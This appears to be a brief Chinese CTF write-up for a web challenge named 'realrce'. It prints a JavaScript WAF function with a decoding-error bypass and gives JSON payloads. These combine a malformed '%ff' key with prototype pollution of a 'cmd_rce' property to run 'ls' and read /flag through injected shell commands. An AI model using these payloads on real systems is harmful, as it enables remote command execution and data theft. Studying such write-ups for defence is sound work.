# web
### realrce

审计代码,发现只要url解码失效waf就会return false,
```js
function waf(input_code) {
    bypasspin = /%[0-9a-fA-F]{2}/i;
    const bypasscode = bypasspin.test(input_code);
    if (bypasscode) {
        try {
            return waf(decodeURIComponent(input_code));
        } catch (error) {
            console.error("Error decoding input: ", error);
            //漏洞产生点
            return false;
        }
    }
    const blacklist = [/__proto__/i, /constructor/i, /prototype/i];
    for (const blackword of blacklist) {
        if (blackword.test(input_code)) {
            return true;
        }
    }
    return false;
}
```
原型链污染`cmd_rce`属性

非预期执行env获取flag
```json
{"msg":{"__proto__":{"cmd_rce":"ls"},"%ff":""}}
```
本来想着绕过xxd空格,正则还没看懂,结果发现已经绕过去了
```json
{"msg":{"__proto__":{"cmd_rce":"ls;xxd`cat /flag`/flag"},"%ff":""}}
```

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-26   05:13